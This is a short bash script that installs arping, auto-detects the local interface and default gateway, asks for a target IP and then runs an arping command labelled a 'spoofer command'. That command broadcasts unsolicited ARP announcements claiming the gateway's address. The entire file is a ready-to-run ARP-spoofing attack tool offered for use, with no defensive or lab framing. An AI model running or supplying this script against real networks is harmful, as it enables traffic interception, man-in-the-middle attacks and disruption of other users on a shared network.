#!/bin/bash

# Function to check if arping is installed
check_arping() {
    if ! command -v arping &> /dev/null; then
        echo "arping not found. Installing..."
        
        # Detect package manager and install arping
        if command -v apt-get &> /dev/null; then
            sudo apt-get update && sudo apt-get install -y arping
        elif command -v yum &> /dev/null; then
            sudo yum install -y arping
        elif command -v dnf &> /dev/null; then
            sudo dnf install -y arping
        elif command -v pacman &> /dev/null; then
            sudo pacman -S --noconfirm arping
        else
            echo "Unsupported package manager. Please install arping manually."
            exit 1
        fi
        
        # Verify installation
        if ! command -v arping &> /dev/null; then
            echo "Failed to install arping. Please install it manually."
            exit 1
        fi
        
        echo "arping installed successfully!"
    fi
}

# Function to auto-detect interface
auto_detect_interface() {
    # Get the default route interface
    local interface=$(ip route | grep default | head -1 | awk '{print $5}' | head -1)
    
    if [[ -n "$interface" ]]; then
        echo "$interface"
    else
        # Fallback: get first non-loopback interface
        interface=$(ip link show | awk -F': ' '/^[0-9]+: [^lo]/ {print $2; exit}')
        echo "$interface"
    fi
}

# Function to auto-detect gateway
auto_detect_gateway() {
    # Get the default gateway
    local gateway=$(ip route | grep default | head -1 | awk '{print $3}')
    
    if [[ -z "$gateway" ]]; then
        # Fallback method
        gateway=$(route -n | grep '^0.0.0.0' | awk '{print $2}' | head -1)
    fi
    
    echo "$gateway"
}

# Check and install arping if needed
check_arping

# Get interface
read -rp "Enter network interface (or press Enter to auto-detect): " INTERFACE
if [[ -z "$INTERFACE" ]]; then
    INTERFACE=$(auto_detect_interface)
    echo "Auto-detected interface: $INTERFACE"
fi

# Validate interface
if ! ip link show "$INTERFACE" &> /dev/null; then
    echo "Error: Interface '$INTERFACE' not found!"
    exit 1
fi

# Get gateway
read -rp "Enter gateway IP (or press Enter to auto-detect): " GATEWAY
if [[ -z "$GATEWAY" ]]; then
    GATEWAY=$(auto_detect_gateway)
    echo "Auto-detected gateway: $GATEWAY"
fi

# Validate gateway format (allow empty gateway for auto-detection edge cases)
if [[ -n "$GATEWAY" ]] && [[ ! "$GATEWAY" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "Error: Invalid gateway format!"
    exit 1
fi

# Get target
read -rp "Enter target IP: " TARGET
if [[ -z "$TARGET" ]]; then
    echo "Error: Target IP is required!"
    exit 1
fi

# Validate target format
if [[ ! "$TARGET" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "Error: Invalid target format!"
    exit 1
fi

echo
echo "Configuration:"
echo "  Interface: $INTERFACE"
echo "  Gateway:   $GATEWAY"
echo "  Target:    $TARGET"
echo

# Confirm before executing
read -rp "Execute spoofer command? (y/N): " CONFIRM
if [[ "$CONFIRM" =~ ^[Yy]$ ]]; then
    echo "Executing..."
    arping -A -i "$INTERFACE" -S "$GATEWAY" -B "$TARGET"
else
    echo "Operation cancelled."
fi
